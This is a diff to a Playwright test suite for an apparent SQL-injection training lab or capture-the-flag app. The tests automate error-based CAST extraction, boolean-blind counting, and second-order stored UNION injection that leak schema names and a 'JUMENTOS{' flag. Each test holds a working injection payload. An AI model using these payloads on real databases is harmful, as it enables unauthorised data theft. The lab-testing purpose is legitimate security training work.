@@ -1,5 +1,7 @@
 import { test, expect } from '@playwright/test'
 
+const runId = Date.now().toString().slice(-5)
+
 
 test.describe('Level 1-1: Login Bypass', () => {
   test('payload 1 - comment out password check', async ({ page }) => {
@@ -86,6 +88,51 @@ test.describe('Level 1-3: UNION-Based DB Enumeration', () => {
   })
 })
 
+
+test.describe('Level 1-4: Error-Based Data Extraction', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/login')
+    await page.fill('#username', 'cristiano')
+    await page.fill('#password', 'goat7')
+    await page.click('[type="submit"]')
+    await page.waitForURL(/\/dashboard/)
+    await page.goto('/dashboard/perfil')
+  })
+
+  test('step 1 - true condition returns found', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=1--')
+    await page.click('.search-btn')
+    await expect(page.locator('.result-found')).toBeVisible()
+  })
+
+  test('step 2 - false condition returns not found (injection confirmed)', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=2--')
+    await page.click('.search-btn')
+    await expect(page.locator('.result-not-found')).toBeVisible()
+  })
+
+  test('step 3 - CAST error leaks table name from information_schema', async ({ page }) => {
+    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--")
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toBeVisible()
+    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
+  })
+
+  test('step 4 - CAST error leaks column name from segredos', async ({ page }) => {
+    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--")
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toBeVisible()
+    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
+  })
+
+  test('step 5 - CAST error leaks flag from segredos.valor', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--')
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-banner')).toBeVisible()
+  })
+})
+
 test.describe('Level 2-1: Boolean-Based Blind SQLi', () => {
   test.beforeEach(async ({ page }) => {
     await page.goto('/tickets')
@@ -103,8 +150,8 @@ test.describe('Level 2-1: Boolean-Based Blind SQLi', () => {
     await expect(page.locator('.result-unavailable')).toBeVisible()
   })
 
-  test('step 2a - count of public tables is 2', async ({ page }) => {
-    await page.fill('.search-bar input', "A1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=2--")
+  test('step 2a - public schema has tables (injection confirmed via count)', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>0--")
     await page.click('.search-btn')
     await expect(page.locator('.result-available')).toBeVisible()
   })
@@ -194,46 +241,42 @@ test.describe('Level 2-2: Time-Based Blind SQLi', () => {
   })
 })
 
-test.describe('Level 1-4: Error-Based Data Extraction', () => {
+test.describe('Level 2-3: Second-Order (Stored) SQLi', () => {
   test.beforeEach(async ({ page }) => {
-    await page.goto('/login')
-    await page.fill('#username', 'cristiano')
-    await page.fill('#password', 'goat7')
-    await page.click('[type="submit"]')
-    await page.waitForURL(/\/dashboard/)
-    await page.goto('/dashboard/perfil')
+    await page.goto('/tickets')
   })
 
-  test('step 1 - true condition returns found', async ({ page }) => {
-    await page.fill('.lookup-bar input', '1 AND 1=1--')
-    await page.click('.search-btn')
-    await expect(page.locator('.result-found')).toBeVisible()
+  test('step 1 - store UNION payload, trigger reveals lista_vip table name', async ({ page }) => {
+    const codigo = `S1${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_name='lista_vip'--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('lista_vip')
   })
 
-  test('step 2 - false condition returns not found (injection confirmed)', async ({ page }) => {
-    await page.fill('.lookup-bar input', '1 AND 1=2--')
-    await page.click('.search-btn')
-    await expect(page.locator('.result-not-found')).toBeVisible()
+  test('step 2 - store UNION payload, trigger reveals segredo column name', async ({ page }) => {
+    const codigo = `S2${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='lista_vip' AND column_name='segredo'--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('segredo')
   })
 
-  test('step 3 - CAST error leaks table name from information_schema', async ({ page }) => {
-    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--")
-    await page.click('.search-btn')
-    await expect(page.locator('.error-msg')).toBeVisible()
-    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
-  })
-
-  test('step 4 - CAST error leaks column name from segredos', async ({ page }) => {
-    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--")
-    await page.click('.search-btn')
-    await expect(page.locator('.error-msg')).toBeVisible()
-    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
-  })
-
-  test('step 5 - CAST error leaks flag from segredos.valor', async ({ page }) => {
-    await page.fill('.lookup-bar input', '1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--')
-    await page.click('.search-btn')
-    await expect(page.locator('.error-msg')).toContainText('JUMENTOS{')
-    await expect(page.locator('.congrats-banner')).toBeVisible()
+  test('step 3 - store flag extraction payload, trigger leaks flag from lista_vip', async ({ page }) => {
+    const codigo = `S3${runId}`
+    await page.fill('#reservar-nome', `' UNION SELECT segredo FROM lista_vip--`)
+    await page.fill('#reservar-codigo', codigo)
+    await page.click('.reservar-btn')
+    await expect(page.locator('.reserva-msg')).toBeVisible()
+    await page.fill('#consultar-codigo', codigo)
+    await page.click('.consultar-btn')
+    await expect(page.locator('.setor-result')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-23')).toBeVisible()
   })
 })
